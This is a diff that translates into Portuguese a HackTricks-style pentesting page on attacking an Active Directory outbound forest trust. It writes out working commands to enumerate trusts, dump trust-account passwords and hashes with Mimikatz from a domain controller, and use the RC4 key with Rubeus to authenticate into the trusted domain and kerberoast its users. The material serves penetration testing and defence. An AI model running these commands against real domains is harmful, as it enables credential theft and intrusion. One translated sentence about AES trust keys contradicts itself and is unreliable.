@@ -1,23 +1,22 @@
-# External Forest Domain - One-Way (Outbound)
+# Domínio Externo da Floresta - Unidirecional (Saída)
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-In this scenario **your domain** is **trusting** some **privileges** to principal from a **different domains**.
+Neste cenário, **seu domínio** está **confiando** alguns **privilégios** a um principal de **domínios diferentes**.
 
-## Enumeration
+## Enumeração
 
-### Outbound Trust
-
+### Confiança de Saída
 ```powershell
 # Notice Outbound trust
 Get-DomainTrust
@@ -39,59 +38,50 @@ MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
 MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
 ## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
 ```
+## Ataque à Conta de Confiança
 
-## Trust Account Attack
+Quando uma confiança de domínio ou floresta do Active Directory é configurada de um domínio _B_ para um domínio _A_ (_**B**_ confia em A), uma conta de confiança é criada no domínio **A**, chamada **B. Kerberos trust keys**. Derivadas da **senha da conta de confiança**, são usadas para **criptografar TGTs inter-realm**, quando usuários do domínio A solicitam tickets de serviço para serviços no domínio B.
 
-When an Active Directory domain or forest trust is set up from a domain _B_ to a domain _A_ (_**B**_ trusts A), a trust account is created in domain **A**, named **B. Kerberos trust keys**,\_derived from the **trust account’s password**, are used for **encrypting inter-realm TGTs**, when users of domain A request service tickets for services in domain B.
-
-It's possible to obtain the password and hash of the trusted account from a Domain Controller using:
-
+É possível obter a senha e o hash da conta confiável de um Controlador de Domínio usando:
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
 ```
-
-The risk is because of trust account B$ is enabled, **B$’s Primary Group is Domain Users of domain A**, any permission granted to Domain Users applies to B$, and it is possible to use B$’s credentials to authenticate against domain A.
+O risco ocorre porque a conta de confiança B$ está habilitada, **o Grupo Primário de B$ é Domain Users do domínio A**, qualquer permissão concedida a Domain Users se aplica a B$, e é possível usar as credenciais de B$ para autenticar-se contra o domínio A.
 
 {% hint style="warning" %}
-Therefore, f**rom the trusting domain it's possible to obtain a user inside the trusted domain**. This user won't have a lot of permissions (just Domain Users probably) but you will be able to **enumerate the external domain**.
+Portanto, **a partir do domínio confiante é possível obter um usuário dentro do domínio confiado**. Esse usuário não terá muitas permissões (provavelmente apenas Domain Users), mas você poderá **enumerar o domínio externo**.
 {% endhint %}
 
-In this example the trusting domain is `ext.local` and the trusted one is `root.local`. Therefore, a user called `EXT$` is created inside `root.local`.
-
+Neste exemplo, o domínio confiante é `ext.local` e o confiado é `root.local`. Portanto, um usuário chamado `EXT$` é criado dentro de `root.local`.
 ```bash
 # Use mimikatz to dump trusted keys
 lsadump::trust /patch
 # You can see in the output the old and current credentials
 # You will find clear text, AES and RC4 hashes
 ```
-
-Therefore, at this point have **`root.local\EXT$`**’s current **cleartext password and Kerberos secret key.** The **`root.local\EXT$`** Kerberos AES secret keys are on identical to the AES trust keys as a different salt is used, but the **RC4 keys are the same**. Therefore, we can **use the RC4 trust key** dumped from ext.local as to **authenticate** as `root.local\EXT$` against `root.local`.
-
+Portanto, neste ponto, temos a **senha em texto claro atual de `root.local\EXT$` e a chave secreta Kerberos**. As chaves secretas AES do Kerberos de `root.local\EXT$` são idênticas às chaves de confiança AES, pois um sal diferente é usado, mas as **chaves RC4 são as mesmas**. Portanto, podemos **usar a chave de confiança RC4** extraída de ext.local para **autenticar** como `root.local\EXT$` contra `root.local`.
 ```bash
 .\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
 ```
-
-With this you can start enumerating that domain and even kerberoasting users:
-
+Com isso, você pode começar a enumerar esse domínio e até mesmo realizar kerberoasting de usuários:
 ```
 .\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
 ```
+### Obtenção de senha de confiança em texto claro
 
-### Gathering cleartext trust password
+No fluxo anterior, foi utilizado o hash de confiança em vez da **senha em texto claro** (que também foi **capturada pelo mimikatz**).
 
-In the previous flow it was used the trust hash instead of the **clear text password** (that was also **dumped by mimikatz**).
-
-The cleartext password can be obtained by converting the \[ CLEAR ] output from mimikatz from hexadecimal and removing null bytes ‘\x00’:
+A senha em texto claro pode ser obtida convertendo a saída \[ CLEAR ] do mimikatz de hexadecimal e removendo bytes nulos '\x00':
 
 ![](<../../.gitbook/assets/image (2) (1) (2).png>)
 
-Sometimes when creating a trust relationship, a password must be typed in by the user for the trust. In this demonstration, the key is the original trust password and therefore human readable. As the key cycles (30 days), the cleartext will not be human-readable but technically still usable.
+Às vezes, ao criar um relacionamento de confiança, uma senha deve ser digitada pelo usuário para a confiança. Nesta demonstração, a chave é a senha de confiança original e, portanto, legível por humanos. À medida que a chave é alterada (a cada 30 dias), o texto claro não será legível por humanos, mas tecnicamente ainda utilizável.
 
-The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT using the Kerberos secret key of the trust account. Here, querying root.local from ext.local for members of Domain Admins:
+A senha em texto claro pode ser usada para realizar autenticação regular como a conta de confiança, uma alternativa para solicitar um TGT usando a chave secreta Kerberos da conta de confiança. Aqui, consultando root.local de ext.local para membros do Domain Admins:
 
 ![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)
 
-## References
+## Referências
 
 * [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)
 
@@ -99,10 +89,10 @@ The cleartext password can be used to perform regular authentication as the trus
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
